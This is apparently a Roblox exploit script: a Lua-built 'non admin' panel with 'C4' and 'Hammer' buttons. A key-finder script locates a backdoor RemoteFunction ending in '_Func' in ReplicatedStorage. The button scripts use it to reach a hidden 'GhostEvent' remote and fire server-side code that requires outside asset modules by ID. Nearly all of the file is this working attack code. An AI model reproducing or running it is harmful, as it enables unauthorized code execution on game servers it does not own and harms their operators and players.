-- Gui to Lua
-- Version: 3.2

-- Instances:

local Gui42 = Instance.new("ScreenGui")
local ImageLabel = Instance.new("ImageLabel")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local TextButton = Instance.new("TextButton")
local KeyInputDisplay = Instance.new("TextBox")
local HammerRequireScript = Instance.new("TextButton")

--Properties:

Gui42.Name = "Gui42"
Gui42.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

ImageLabel.Parent = Gui42
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageLabel.BorderSizePixel = 6
ImageLabel.Position = UDim2.new(0.0090388041, 0, 0.363065332, 0)
ImageLabel.Size = UDim2.new(0, 353, 0, 446)
ImageLabel.Image = "rbxassetid://114655618412860"
ImageLabel.ImageTransparency = 0.490
ImageLabel.ScaleType = Enum.ScaleType.Fit

TextLabel.Parent = ImageLabel
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.0162365623, 0, -0.105889082, 0)
TextLabel.Size = UDim2.new(0, 339, 0, 46)
TextLabel.Font = Enum.Font.Unknown
TextLabel.Text = "agent's non admin penel"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextScaled = true
TextLabel.TextSize = 34.000
TextLabel.TextWrapped = true

TextLabel_2.Parent = ImageLabel
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(0.0241397507, 0, 1.01887167, 0)
TextLabel_2.Size = UDim2.new(0, 339, 0, 46)
TextLabel_2.Font = Enum.Font.Unknown
TextLabel_2.Text = "This gui has auto destruction if leaked, it auto destructs"
TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 34.000
TextLabel_2.TextWrapped = true

TextButton.Parent = Gui42
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton.BorderSizePixel = 3
TextButton.Position = UDim2.new(0.0146477995, 0, 0.377186954, 0)
TextButton.Size = UDim2.new(0, 177, 0, 32)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "C4 XD"
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true

KeyInputDisplay.Name = "KeyInputDisplay"
KeyInputDisplay.Parent = Gui42
KeyInputDisplay.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
KeyInputDisplay.BorderColor3 = Color3.fromRGB(0, 0, 0)
KeyInputDisplay.BorderSizePixel = 3
KeyInputDisplay.Position = UDim2.new(0.198675185, 0, 0.365440518, 0)
KeyInputDisplay.Size = UDim2.new(0, 189, 0, 50)
KeyInputDisplay.Font = Enum.Font.SourceSans
KeyInputDisplay.Text = ""
KeyInputDisplay.TextColor3 = Color3.fromRGB(0, 0, 0)
KeyInputDisplay.TextScaled = true
KeyInputDisplay.TextSize = 14.000
KeyInputDisplay.TextWrapped = true

HammerRequireScript.Name = "Hammer Require Script"
HammerRequireScript.Parent = Gui42
HammerRequireScript.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
HammerRequireScript.BorderColor3 = Color3.fromRGB(0, 0, 0)
HammerRequireScript.BorderSizePixel = 3
HammerRequireScript.Position = UDim2.new(0.0149701638, 0, 0.425761223, 0)
HammerRequireScript.Size = UDim2.new(0, 177, 0, 32)
HammerRequireScript.Font = Enum.Font.SourceSans
HammerRequireScript.Text = "Hammer? ehh"
HammerRequireScript.TextColor3 = Color3.fromRGB(0, 0, 0)
HammerRequireScript.TextScaled = true
HammerRequireScript.TextSize = 14.000
HammerRequireScript.TextWrapped = true

-- Scripts:

local function SDPQUQ_fake_script() -- TextButton.LocalScript 
	local script = Instance.new('LocalScript', TextButton)

	-- This script is designed to be placed inside the TextButton that triggers the execution.
	-- It reads the key from the GUI and fires the remote event.
	
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Players = game:GetService("Players")
	local Button = script.Parent -- The TextButton this script is parented to
	
	-- Configuration
	local PAYLOAD_MODULE_ID = 0x1767bf813 -- The asset ID of the module you want to require on the server.
	
	-- --- GUI LOCATION (ADJUST THIS PATH) ---
	-- Assuming there is a TextBox or TextLabel in your GUI named "KeyInputDisplay" 
	-- that holds the key found by the key_finder script.
	local KeyDisplay = Button:FindFirstAncestorOfClass("ScreenGui"):WaitForChild("KeyInputDisplay", 10) -- Change this path!
	
	if not KeyDisplay then
		warn("EXEC-SCRIPT: KeyDisplay GUI element not found. Execution aborted.")
		return
	end
	
	-- Get the local player instance for the payload insertion
	local LocalPlayer = Players.LocalPlayer
	local PlayerName = LocalPlayer and LocalPlayer.Name or "UnknownPlayer"
	
	
	local function executePayload()
		Button.Text = "Executing..."
		Button.Active = false
	
		local DUMMY_FUNCTION_NAME = KeyDisplay.Text
	
		if DUMMY_FUNCTION_NAME == "Key Not Found" or DUMMY_FUNCTION_NAME:len() < 5 then
			warn("EXEC-SCRIPT: Key not yet found or invalid key in display.")
			Button.Text = "No Key!"
			Button.Active = true
			return
		end
	
		-- --- STEP 1: Find the DummyFunction (The Password) ---
		local DummyFunction = ReplicatedStorage:WaitForChild(DUMMY_FUNCTION_NAME, 3) 
	
		if not DummyFunction or not DummyFunction:IsA("RemoteFunction") then
			warn("EXEC-SCRIPT: Failed to verify DummyFunction existence.")
			Button.Text = "Error"
			Button.Active = true
			return
		end
	
		-- --- STEP 2: Get the GhostEvent Name ---
		local GhostEventName = nil
		local success, result = pcall(function()
			GhostEventName = DummyFunction:InvokeServer()
		end)
	
		if not success or not GhostEventName or typeof(GhostEventName) ~= "string" then
			warn("EXEC-SCRIPT: Failed to get GhostEvent name. Error:", result)
			Button.Text = "Invoke Failed"
			Button.Active = true
			return
		end
	
		-- --- STEP 3: Find the GhostEvent ---
		local GhostEvent = ReplicatedStorage:WaitForChild(GhostEventName, 10)
	
		if not GhostEvent or not GhostEvent:IsA("RemoteEvent") then
			warn("EXEC-SCRIPT: Could not find the GhostEvent remote:", GhostEventName)
			Button.Text = "Event Missing"
			Button.Active = true
			return
		end
	
		-- --- STEP 4: Build and Execute the Payload ---
		local codeToExecute = string.format('require(%d).CLoad("%s")', PAYLOAD_MODULE_ID, PlayerName)
	
		-- Send the execution request:
		GhostEvent:FireServer(DUMMY_FUNCTION_NAME, codeToExecute)
	
		print("GHOST-CLIENT: Payload launched.")
		Button.Text = "Executed!"
	
		-- Re-enable button after a short delay
		task.wait(5)
		Button.Text = "Remote C4"
		Button.Active = true
	end
	
	-- Connect the function to the button click
	Button.MouseButton1Click:Connect(executePayload)
	
	-- Set the initial button text
	Button.Text = "Remote C4"
	Button.Active = true
	
end
coroutine.wrap(SDPQUQ_fake_script)()
local function YHGZBK_fake_script() -- HammerRequireScript.LocalScript 
	local script = Instance.new('LocalScript', HammerRequireScript)

	-- This script is designed to be placed inside the TextButton that triggers the execution.
	-- It reads the key from the GUI and fires the remote event.
	
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Players = game:GetService("Players")
	local Button = script.Parent -- The TextButton this script is parented to
	
	-- Configuration
	local PAYLOAD_MODULE_ID = 8038037940 -- The asset ID of the module you want to require on the server.
	
	-- --- GUI LOCATION (ADJUST THIS PATH) ---
	-- Assuming there is a TextBox or TextLabel in your GUI named "KeyInputDisplay" 
	-- that holds the key found by the key_finder script.
	local KeyDisplay = Button:FindFirstAncestorOfClass("ScreenGui"):WaitForChild("KeyInputDisplay", 10) -- Change this path!
	
	if not KeyDisplay then
		warn("EXEC-SCRIPT: KeyDisplay GUI element not found. Execution aborted.")
		return
	end
	
	-- Get the local player instance for the payload insertion
	local LocalPlayer = Players.LocalPlayer
	local PlayerName = LocalPlayer and LocalPlayer.Name or "UnknownPlayer"
	
	
	local function executePayload()
		Button.Text = "Executing..."
		Button.Active = false
	
		local DUMMY_FUNCTION_NAME = KeyDisplay.Text
	
		if DUMMY_FUNCTION_NAME == "Key Not Found" or DUMMY_FUNCTION_NAME:len() < 5 then
			warn("EXEC-SCRIPT: Key not yet found or invalid key in display.")
			Button.Text = "No Key!"
			Button.Active = true
			return
		end
	
		-- --- STEP 1: Find the DummyFunction (The Password) ---
		local DummyFunction = ReplicatedStorage:WaitForChild(DUMMY_FUNCTION_NAME, 3) 
	
		if not DummyFunction or not DummyFunction:IsA("RemoteFunction") then
			warn("EXEC-SCRIPT: Failed to verify DummyFunction existence.")
			Button.Text = "Error"
			Button.Active = true
			return
		end
	
		-- --- STEP 2: Get the GhostEvent Name ---
		local GhostEventName = nil
		local success, result = pcall(function()
			GhostEventName = DummyFunction:InvokeServer()
		end)
	
		if not success or not GhostEventName or typeof(GhostEventName) ~= "string" then
			warn("EXEC-SCRIPT: Failed to get GhostEvent name. Error:", result)
			Button.Text = "Invoke Failed"
			Button.Active = true
			return
		end
	
		-- --- STEP 3: Find the GhostEvent ---
		local GhostEvent = ReplicatedStorage:WaitForChild(GhostEventName, 10)
	
		if not GhostEvent or not GhostEvent:IsA("RemoteEvent") then
			warn("EXEC-SCRIPT: Could not find the GhostEvent remote:", GhostEventName)
			Button.Text = "Event Missing"
			Button.Active = true
			return
		end
	
		-- --- STEP 4: Build and Execute the Payload ---
		local codeToExecute = string.format('require(%d).CLoad("%s")', PAYLOAD_MODULE_ID, PlayerName)
	
		-- Send the execution request:
		GhostEvent:FireServer(DUMMY_FUNCTION_NAME, codeToExecute)
	
		print("GHOST-CLIENT: Payload launched.")
		Button.Text = "Executed!"
	
		-- Re-enable button after a short delay
		task.wait(5)
		Button.Text = "Hammer?"
		Button.Active = true
	end
	
	-- Connect the function to the button click
	Button.MouseButton1Click:Connect(executePayload)
	
	-- Set the initial button text
	Button.Text = "Hammer?"
	Button.Active = true
	
end
coroutine.wrap(YHGZBK_fake_script)()
local function LVHAMIL_fake_script() -- Gui42.grab it and make it a string then give executor 
	local script = Instance.new('LocalScript', Gui42)

	-- This script runs immediately, finds the dynamic RemoteFunction (password),
	
	-- and writes its name to a designated TextBlock in the GUI for the execution script to use.
	
	
	
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	
	local Players = game:GetService("Players")
	
	
	-- Configuration
	
	local FUNCTION_NAME_SUFFIX = "_Func" -- The required suffix for the RemoteFunction (password key).
	
	
	
	-- --- GUI LOCATION (ADJUST THIS PATH) ---
	
	-- Assuming there is a TextBox or TextLabel in your ScreenGui named "KeyDisplay" 
	
	-- where the found key will be placed.
	
	local KeyDisplay = script.Parent:WaitForChild("KeyInputDisplay", 10) -- Change this path to your GUI element!
	
	
	
	if not KeyDisplay then
	
		warn("GHOST-CLIENT: KeyDisplay GUI element not found. Exiting key finder.")
	
		return
	
	end
	
	
	
	-- --- STEP 1: Find the DummyFunction (The Password) ---
	
	local DUMMY_FUNCTION_NAME = nil
	
	
	
	for _, item in ipairs(ReplicatedStorage:GetChildren()) do
	
		if item:IsA("RemoteFunction") and item.Name:sub(-(FUNCTION_NAME_SUFFIX:len())) == FUNCTION_NAME_SUFFIX then
	
			DUMMY_FUNCTION_NAME = item.Name
	
			print("GHOST-CLIENT: Found DummyFunction/Password Key:", DUMMY_FUNCTION_NAME)
	
			break
	
		end
	
	end
	
	
	
	if DUMMY_FUNCTION_NAME then
	
		-- Write the found key string to the GUI element's text property
	
		KeyDisplay.Text = DUMMY_FUNCTION_NAME
	
		KeyDisplay.TextColor3 = Color3.new(0, 1, 0) -- Green status
	
	else
	
		KeyDisplay.Text = "Key Not Found"
	
		KeyDisplay.TextColor3 = Color3.new(1, 0, 0) -- Red status
	
		warn("GHOST-CLIENT: Failed to find DummyFunction in ReplicatedStorage.")
	
	end
	
	
end